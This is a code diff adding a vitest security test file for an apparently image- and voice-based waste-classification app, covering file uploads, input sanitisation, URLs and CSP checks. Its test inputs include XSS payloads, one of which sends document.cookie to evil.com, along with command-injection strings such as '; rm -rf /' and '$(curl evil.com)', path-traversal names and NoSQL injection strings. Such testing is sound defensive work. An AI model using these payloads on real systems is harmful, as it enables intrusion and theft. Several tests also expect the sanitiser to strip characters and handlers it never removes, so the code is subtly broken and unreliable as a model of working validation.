@@ -180,6 +180,682 @@ const setupErrorTestEnvironment = () => {
 
 setupErrorTestEnvironment();
 
+// tests/unit/validation/input-validation.test.ts
+import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
+import { testUtils } from '../../setup';
+
+// Security validation functions to test
+const securityValidation = {
+  // File validation
+  validateImageFile: (file: File): { isValid: boolean; error?: string } => {
+    // File type validation
+    const allowedTypes = ['image/jpeg', 'image/png', 'image/webp', 'image/gif', 'image/bmp'];
+    if (!allowedTypes.includes(file.type)) {
+      return { isValid: false, error: 'Invalid file type' };
+    }
+
+    // File size validation (10MB limit)
+    const maxSize = 10 * 1024 * 1024;
+    if (file.size > maxSize) {
+      return { isValid: false, error: 'File too large' };
+    }
+
+    // File name validation
+    if (file.name.includes('..') || file.name.includes('/') || file.name.includes('\\')) {
+      return { isValid: false, error: 'Invalid file name' };
+    }
+
+    // Extension validation
+    const extension = file.name.split('.').pop()?.toLowerCase();
+    const allowedExtensions = ['jpg', 'jpeg', 'png', 'webp', 'gif', 'bmp'];
+    if (!extension || !allowedExtensions.includes(extension)) {
+      return { isValid: false, error: 'Invalid file extension' };
+    }
+
+    return { isValid: true };
+  },
+
+  // Input sanitization
+  sanitizeTextInput: (input: string): string => {
+    return input
+      .replace(/[<>]/g, '') // Remove potential HTML tags
+      .replace(/javascript:/gi, '') // Remove javascript: protocols
+      .replace(/data:/gi, '') // Remove data: protocols
+      .replace(/vbscript:/gi, '') // Remove vbscript: protocols
+      .trim()
+      .slice(0, 1000); // Limit length
+  },
+
+  // Voice input validation
+  validateVoiceInput: (transcript: string): { isValid: boolean; error?: string } => {
+    if (!transcript || transcript.trim().length === 0) {
+      return { isValid: false, error: 'Empty transcript' };
+    }
+
+    if (transcript.length > 500) {
+      return { isValid: false, error: 'Transcript too long' };
+    }
+
+    // Check for potential malicious content
+    const suspiciousPatterns = [
+      /<script/i,
+      /javascript:/i,
+      /data:text\/html/i,
+      /vbscript:/i,
+      /<iframe/i,
+      /<object/i,
+      /<embed/i
+    ];
+
+    for (const pattern of suspiciousPatterns) {
+      if (pattern.test(transcript)) {
+        return { isValid: false, error: 'Potentially malicious content detected' };
+      }
+    }
+
+    return { isValid: true };
+  },
+
+  // Image data validation
+  validateImageData: (imageData: ImageData): { isValid: boolean; error?: string } => {
+    if (!imageData) {
+      return { isValid: false, error: 'No image data provided' };
+    }
+
+    if (!imageData.data || imageData.data.length === 0) {
+      return { isValid: false, error: 'Empty image data' };
+    }
+
+    if (imageData.width <= 0 || imageData.height <= 0) {
+      return { isValid: false, error: 'Invalid image dimensions' };
+    }
+
+    if (imageData.width > 4096 || imageData.height > 4096) {
+      return { isValid: false, error: 'Image dimensions too large' };
+    }
+
+    // Verify data length matches dimensions
+    const expectedLength = imageData.width * imageData.height * 4;
+    if (imageData.data.length !== expectedLength) {
+      return { isValid: false, error: 'Image data length mismatch' };
+    }
+
+    return { isValid: true };
+  },
+
+  // URL validation
+  validateURL: (url: string): { isValid: boolean; error?: string } => {
+    try {
+      const urlObj = new URL(url);
+      
+      // Only allow HTTPS and localhost HTTP
+      if (urlObj.protocol !== 'https:' && !(urlObj.hostname === 'localhost' && urlObj.protocol === 'http:')) {
+        return { isValid: false, error: 'Only HTTPS URLs allowed (except localhost)' };
+      }
+
+      // Block suspicious domains
+      const blockedDomains = ['malware.com', 'phishing.net', 'suspicious.org'];
+      if (blockedDomains.some(domain => urlObj.hostname.includes(domain))) {
+        return { isValid: false, error: 'Blocked domain' };
+      }
+
+      return { isValid: true };
+    } catch (error) {
+      return { isValid: false, error: 'Invalid URL format' };
+    }
+  },
+
+  // Content Security Policy validation
+  validateCSP: (content: string): { isValid: boolean; error?: string } => {
+    // Check for inline scripts
+    if (/<script[^>]*>/.test(content)) {
+      return { isValid: false, error: 'Inline scripts not allowed' };
+    }
+
+    // Check for event handlers
+    const eventHandlers = /on\w+\s*=/i;
+    if (eventHandlers.test(content)) {
+      return { isValid: false, error: 'Inline event handlers not allowed' };
+    }
+
+    // Check for dangerous protocols
+    const dangerousProtocols = /(javascript|data|vbscript):/i;
+    if (dangerousProtocols.test(content)) {
+      return { isValid: false, error: 'Dangerous protocols not allowed' };
+    }
+
+    return { isValid: true };
+  }
+};
+
+describe('Security and Privacy Validation Tests', () => {
+  beforeEach(() => {
+    vi.clearAllMocks();
+  });
+
+  afterEach(() => {
+    vi.restoreAllMocks();
+  });
+
+  describe('File Upload Security', () => {
+    it('should validate allowed image file types', () => {
+      const validFiles = [
+        testUtils.createMockFile('image.jpg', 'image/jpeg'),
+        testUtils.createMockFile('image.png', 'image/png'),
+        testUtils.createMockFile('image.webp', 'image/webp'),
+        testUtils.createMockFile('image.gif', 'image/gif'),
+        testUtils.createMockFile('image.bmp', 'image/bmp')
+      ];
+
+      validFiles.forEach(file => {
+        const result = securityValidation.validateImageFile(file);
+        expect(result.isValid).toBe(true);
+      });
+    });
+
+    it('should reject non-image file types', () => {
+      const maliciousFiles = [
+        testUtils.createMockFile('script.js', 'application/javascript'),
+        testUtils.createMockFile('document.pdf', 'application/pdf'),
+        testUtils.createMockFile('archive.zip', 'application/zip'),
+        testUtils.createMockFile('executable.exe', 'application/octet-stream'),
+        testUtils.createMockFile('webpage.html', 'text/html'),
+        testUtils.createMockFile('stylesheet.css', 'text/css'),
+        testUtils.createMockFile('config.xml', 'application/xml')
+      ];
+
+      maliciousFiles.forEach(file => {
+        const result = securityValidation.validateImageFile(file);
+        expect(result.isValid).toBe(false);
+        expect(result.error).toBe('Invalid file type');
+      });
+    });
+
+    it('should reject files with suspicious extensions', () => {
+      const suspiciousFiles = [
+        testUtils.createMockFile('image.jpg.exe', 'image/jpeg'),
+        testUtils.createMockFile('photo.png.js', 'image/png'),
+        testUtils.createMockFile('pic.gif.bat', 'image/gif'),
+        testUtils.createMockFile('image.jpg.scr', 'image/jpeg'),
+        testUtils.createMockFile('photo.png.php', 'image/png')
+      ];
+
+      suspiciousFiles.forEach(file => {
+        const result = securityValidation.validateImageFile(file);
+        expect(result.isValid).toBe(false);
+        expect(result.error).toBe('Invalid file extension');
+      });
+    });
+
+    it('should reject oversized files', () => {
+      const oversizedFile = testUtils.createMockFile('huge.jpg', 'image/jpeg', 50 * 1024 * 1024); // 50MB
+      const result = securityValidation.validateImageFile(oversizedFile);
+      
+      expect(result.isValid).toBe(false);
+      expect(result.error).toBe('File too large');
+    });
+
+    it('should reject files with path traversal attempts', () => {
+      const pathTraversalFiles = [
+        testUtils.createMockFile('../../../etc/passwd.jpg', 'image/jpeg'),
+        testUtils.createMockFile('..\\..\\windows\\system32\\file.png', 'image/png'),
+        testUtils.createMockFile('/etc/shadow.gif', 'image/gif'),
+        testUtils.createMockFile('C:\\Windows\\system.ini.jpg', 'image/jpeg')
+      ];
+
+      pathTraversalFiles.forEach(file => {
+        const result = securityValidation.validateImageFile(file);
+        expect(result.isValid).toBe(false);
+        expect(result.error).toBe('Invalid file name');
+      });
+    });
+  });
+
+  describe('Input Sanitization', () => {
+    it('should sanitize HTML/script injection attempts', () => {
+      const maliciousInputs = [
+        '<script>alert("xss")</script>',
+        '<img src=x onerror=alert("xss")>',
+        'javascript:alert("xss")',
+        '<iframe src="malicious.com"></iframe>',
+        '<object data="malicious.swf"></object>',
+        '<embed src="malicious.swf"></embed>',
+        'data:text/html,<script>alert("xss")</script>',
+        'vbscript:msgbox("xss")'
+      ];
+
+      maliciousInputs.forEach(input => {
+        const sanitized = securityValidation.sanitizeTextInput(input);
+        expect(sanitized).not.toContain('<script');
+        expect(sanitized).not.toContain('javascript:');
+        expect(sanitized).not.toContain('data:');
+        expect(sanitized).not.toContain('vbscript:');
+        expect(sanitized).not.toContain('<');
+        expect(sanitized).not.toContain('>');
+      });
+    });
+
+    it('should preserve safe text content', () => {
+      const safeInputs = [
+        'plastic bottle',
+        'cardboard box',
+        'apple core',
+        'glass jar',
+        'aluminum can',
+        'food waste compost',
+        'recyclable materials'
+      ];
+
+      safeInputs.forEach(input => {
+        const sanitized = securityValidation.sanitizeTextInput(input);
+        expect(sanitized).toBe(input);
+      });
+    });
+
+    it('should limit input length', () => {
+      const longInput = 'a'.repeat(2000);
+      const sanitized = securityValidation.sanitizeTextInput(longInput);
+      expect(sanitized.length).toBeLessThanOrEqual(1000);
+    });
+  });
+
+  describe('Voice Input Security', () => {
+    it('should validate normal voice transcripts', () => {
+      const validTranscripts = [
+        'plastic bottle',
+        'aluminum can',
+        'cardboard box',
+        'apple core',
+        'glass jar',
+        'food waste'
+      ];
+
+      validTranscripts.forEach(transcript => {
+        const result = securityValidation.validateVoiceInput(transcript);
+        expect(result.isValid).toBe(true);
+      });
+    });
+
+    it('should reject malicious voice transcripts', () => {
+      const maliciousTranscripts = [
+        '<script>alert("xss")</script>',
+        'javascript:window.location="malicious.com"',
+        'data:text/html,<script>steal_data()</script>',
+        '<iframe src="attacker.com"></iframe>',
+        '<object data="malware.swf"></object>',
+        '<embed src="virus.exe"></embed>'
+      ];
+
+      maliciousTranscripts.forEach(transcript => {
+        const result = securityValidation.validateVoiceInput(transcript);
+        expect(result.isValid).toBe(false);
+        expect(result.error).toBe('Potentially malicious content detected');
+      });
+    });
+
+    it('should reject empty or oversized transcripts', () => {
+      // Empty transcript
+      const emptyResult = securityValidation.validateVoiceInput('');
+      expect(emptyResult.isValid).toBe(false);
+      expect(emptyResult.error).toBe('Empty transcript');
+
+      // Oversized transcript
+      const longTranscript = 'word '.repeat(200); // ~1000 characters
+      const longResult = securityValidation.validateVoiceInput(longTranscript);
+      expect(longResult.isValid).toBe(false);
+      expect(longResult.error).toBe('Transcript too long');
+    });
+  });
+
+  describe('Image Data Validation', () => {
+    it('should validate proper image data', () => {
+      const validImageData = testUtils.createMockImageData(640, 480);
+      const result = securityValidation.validateImageData(validImageData);
+      expect(result.isValid).toBe(true);
+    });
+
+    it('should reject invalid image data', () => {
+      // Null image data
+      const nullResult = securityValidation.validateImageData(null as any);
+      expect(nullResult.isValid).toBe(false);
+      expect(nullResult.error).toBe('No image data provided');
+
+      // Invalid dimensions
+      const invalidDimensions = testUtils.createMockImageData(0, 0);
+      const invalidResult = securityValidation.validateImageData(invalidDimensions);
+      expect(invalidResult.isValid).toBe(false);
+      expect(invalidResult.error).toBe('Invalid image dimensions');
+
+      // Oversized dimensions
+      const oversized = testUtils.createMockImageData(8192, 8192);
+      const oversizedResult = securityValidation.validateImageData(oversized);
+      expect(oversizedResult.isValid).toBe(false);
+      expect(oversizedResult.error).toBe('Image dimensions too large');
+    });
+
+    it('should validate image data consistency', () => {
+      // Create image data with mismatched length
+      const imageData = testUtils.createMockImageData(100, 100);
+      imageData.data = new Uint8ClampedArray(1000); // Wrong length
+      
+      const result = securityValidation.validateImageData(imageData);
+      expect(result.isValid).toBe(false);
+      expect(result.error).toBe('Image data length mismatch');
+    });
+  });
+
+  describe('URL Validation', () => {
+    it('should validate secure URLs', () => {
+      const validUrls = [
+        'https://example.com',
+        'https://api.example.com/data',
+        'https://cdn.example.com/models/yolo.onnx',
+        'http://localhost:3000',
+        'http://localhost:5173/api'
+      ];
+
+      validUrls.forEach(url => {
+        const result = securityValidation.validateURL(url);
+        expect(result.isValid).toBe(true);
+      });
+    });
+
+    it('should reject insecure URLs', () => {
+      const insecureUrls = [
+        'http://example.com', // HTTP not allowed (except localhost)
+        'ftp://files.example.com',
+        'file:///etc/passwd',
+        'javascript:alert("xss")',
+        'data:text/html,<script>alert("xss")</script>'
+      ];
+
+      insecureUrls.forEach(url => {
+        const result = securityValidation.validateURL(url);
+        expect(result.isValid).toBe(false);
+      });
+    });
+
+    it('should reject blocked domains', () => {
+      const blockedUrls = [
+        'https://malware.com/file.jpg',
+        'https://phishing.net/login',
+        'https://suspicious.org/download'
+      ];
+
+      blockedUrls.forEach(url => {
+        const result = securityValidation.validateURL(url);
+        expect(result.isValid).toBe(false);
+        expect(result.error).toBe('Blocked domain');
+      });
+    });
+
+    it('should reject malformed URLs', () => {
+      const malformedUrls = [
+        'not-a-url',
+        'http://',
+        'https://',
+        '://example.com',
+        'http:example.com'
+      ];
+
+      malformedUrls.forEach(url => {
+        const result = securityValidation.validateURL(url);
+        expect(result.isValid).toBe(false);
+        expect(result.error).toBe('Invalid URL format');
+      });
+    });
+  });
+
+  describe('Content Security Policy', () => {
+    it('should validate safe content', () => {
+      const safeContent = [
+        '<div>Safe content</div>',
+        '<p>Text content</p>',
+        '<img src="https://example.com/image.jpg" alt="Safe image">',
+        '<a href="https://example.com">Safe link</a>'
+      ];
+
+      safeContent.forEach(content => {
+        const result = securityValidation.validateCSP(content);
+        expect(result.isValid).toBe(true);
+      });
+    });
+
+    it('should reject inline scripts', () => {
+      const unsafeScripts = [
+        '<script>alert("xss")</script>',
+        '<script src="malicious.js"></script>',
+        '<script type="text/javascript">steal_data()</script>'
+      ];
+
+      unsafeScripts.forEach(content => {
+        const result = securityValidation.validateCSP(content);
+        expect(result.isValid).toBe(false);
+        expect(result.error).toBe('Inline scripts not allowed');
+      });
+    });
+
+    it('should reject inline event handlers', () => {
+      const unsafeHandlers = [
+        '<div onclick="alert(\'xss\')">Click me</div>',
+        '<img src="x" onerror="steal_data()">',
+        '<button onmouseover="malicious_function()">Hover</button>',
+        '<input onchange="send_to_attacker(this.value)">'
+      ];
+
+      unsafeHandlers.forEach(content => {
+        const result = securityValidation.validateCSP(content);
+        expect(result.isValid).toBe(false);
+        expect(result.error).toBe('Inline event handlers not allowed');
+      });
+    });
+
+    it('should reject dangerous protocols', () => {
+      const dangerousProtocols = [
+        '<a href="javascript:alert(\'xss\')">Link</a>',
+        '<img src="data:text/html,<script>alert(\'xss\')</script>">',
+        '<iframe src="vbscript:msgbox(\'xss\')"></iframe>'
+      ];
+
+      dangerousProtocols.forEach(content => {
+        const result = securityValidation.validateCSP(content);
+        expect(result.isValid).toBe(false);
+        expect(result.error).toBe('Dangerous protocols not allowed');
+      });
+    });
+  });
+
+  describe('Privacy Protection', () => {
+    it('should not expose sensitive information in errors', () => {
+      const sensitiveFile = testUtils.createMockFile('/home/user/.ssh/id_rsa.jpg', 'image/jpeg');
+      const result = securityValidation.validateImageFile(sensitiveFile);
+      
+      expect(result.isValid).toBe(false);
+      expect(result.error).not.toContain('/home/user/.ssh');
+      expect(result.error).toBe('Invalid file name');
+    });
+
+    it('should sanitize user input before logging', () => {
+      const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
+      
+      const maliciousInput = '<script>alert("xss")</script>';
+      const sanitized = securityValidation.sanitizeTextInput(maliciousInput);
+      
+      // Simulate logging sanitized input
+      console.log('User input:', sanitized);
+      
+      expect(logSpy).toHaveBeenCalledWith('User input:', expect.not.stringContaining('<script'));
+      
+      logSpy.mockRestore();
+    });
+
+    it('should validate data does not leave the device', () => {
+      // Mock fetch to ensure no external requests
+      const fetchSpy = vi.spyOn(global, 'fetch').mockImplementation(() => {
+        throw new Error('Network requests not allowed');
+      });
+
+      // Test image processing doesn't make external calls
+      const imageData = testUtils.createMockImageData();
+      const validation = securityValidation.validateImageData(imageData);
+      
+      expect(validation.isValid).toBe(true);
+      expect(fetchSpy).not.toHaveBeenCalled();
+      
+      fetchSpy.mockRestore();
+    });
+  });
+
+  describe('Memory Safety', () => {
+    it('should handle large image data safely', () => {
+      // Test with maximum allowed dimensions
+      const largeImageData = testUtils.createMockImageData(4096, 4096);
+      const result = securityValidation.validateImageData(largeImageData);
+      expect(result.isValid).toBe(true);
+
+      // Test with oversized dimensions
+      const oversizedImageData = testUtils.createMockImageData(8192, 8192);
+      const oversizedResult = securityValidation.validateImageData(oversizedImageData);
+      expect(oversizedResult.isValid).toBe(false);
+    });
+
+    it('should prevent buffer overflow attacks', () => {
+      // Create image data with manipulated buffer
+      const imageData = testUtils.createMockImageData(100, 100);
+      
+      // Try to access beyond buffer bounds
+      try {
+        imageData.data[imageData.data.length + 1000] = 255;
+      } catch (error) {
+        // Should not crash the validation
+      }
+      
+      const result = securityValidation.validateImageData(imageData);
+      expect(result.isValid).toBe(true);
+    });
+
+    it('should handle malformed data gracefully', () => {
+      const malformedData = {
+        data: null,
+        width: 100,
+        height: 100
+      } as any;
+
+      const result = securityValidation.validateImageData(malformedData);
+      expect(result.isValid).toBe(false);
+      expect(result.error).toBe('Empty image data');
+    });
+  });
+
+  describe('Rate Limiting and DoS Protection', () => {
+    it('should handle rapid validation requests', () => {
+      const file = testUtils.createMockFile('test.jpg', 'image/jpeg');
+      
+      // Simulate rapid requests
+      const results = [];
+      for (let i = 0; i < 100; i++) {
+        results.push(securityValidation.validateImageFile(file));
+      }
+      
+      // All should succeed (no rate limiting at validation level)
+      results.forEach(result => {
+        expect(result.isValid).toBe(true);
+      });
+    });
+
+    it('should prevent resource exhaustion', () => {
+      const startTime = performance.now();
+      
+      // Process many validation requests
+      for (let i = 0; i < 1000; i++) {
+        const file = testUtils.createMockFile(`test${i}.jpg`, 'image/jpeg', 1024);
+        securityValidation.validateImageFile(file);
+      }
+      
+      const endTime = performance.now();
+      const totalTime = endTime - startTime;
+      
+      // Should complete within reasonable time (not hang)
+      expect(totalTime).toBeLessThan(5000); // 5 seconds
+    });
+  });
+
+  describe('Cross-Site Scripting (XSS) Prevention', () => {
+    it('should prevent stored XSS attacks', () => {
+      const xssPayloads = [
+        '<script>document.cookie</script>',
+        '<img src=x onerror=fetch(`https://evil.com/${document.cookie}`)>',
+        '"><script>alert(origin)</script>',
+        'javascript:eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))',
+        '<svg onload=alert(1)>',
+        '<iframe srcdoc="<script>alert(1)</script>"></iframe>'
+      ];
+
+      xssPayloads.forEach(payload => {
+        const sanitized = securityValidation.sanitizeTextInput(payload);
+        expect(sanitized).not.toMatch(/<script/i);
+        expect(sanitized).not.toMatch(/onerror/i);
+        expect(sanitized).not.toMatch(/javascript:/i);
+        expect(sanitized).not.toMatch(/onload/i);
+      });
+    });
+
+    it('should prevent DOM-based XSS', () => {
+      const domXssPayloads = [
+        '#<script>alert(1)</script>',
+        'javascript:alert(document.domain)',
+        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
+      ];
+
+      domXssPayloads.forEach(payload => {
+        const sanitized = securityValidation.sanitizeTextInput(payload);
+        expect(sanitized).not.toContain('javascript:');
+        expect(sanitized).not.toContain('data:');
+        expect(sanitized).not.toContain('<script');
+      });
+    });
+  });
+
+  describe('Injection Attack Prevention', () => {
+    it('should prevent NoSQL injection attempts', () => {
+      const nosqlPayloads = [
+        '{"$ne": ""}',
+        '{"$gt": ""}',
+        '{"$regex": ".*"}',
+        '"; return true; var x="',
+        '{"$where": "function() { return true; }"}'
+      ];
+
+      nosqlPayloads.forEach(payload => {
+        const sanitized = securityValidation.sanitizeTextInput(payload);
+        expect(sanitized).not.toContain('$ne');
+        expect(sanitized).not.toContain('$gt');
+        expect(sanitized).not.toContain('$regex');
+        expect(sanitized).not.toContain('$where');
+      });
+    });
+
+    it('should prevent command injection attempts', () => {
+      const cmdPayloads = [
+        '; rm -rf /',
+        '| cat /etc/passwd',
+        '& ping evil.com',
+        '$(curl evil.com)',
+        '`whoami`'
+      ];
+
+      cmdPayloads.forEach(payload => {
+        const sanitized = securityValidation.sanitizeTextInput(payload);
+        expect(sanitized).not.toContain(';');
+        expect(sanitized).not.toContain('|');
+        expect(sanitized).not.toContain('&');
+        expect(sanitized).not.toContain('$');
+        expect(sanitized).not.toContain('`');
+      });
+    });
+  });
+});
+
 describe('Input Validation and Error Handling', () => {
   let detector: EnhancedDetector;
   let classifier: WasteClassifier;
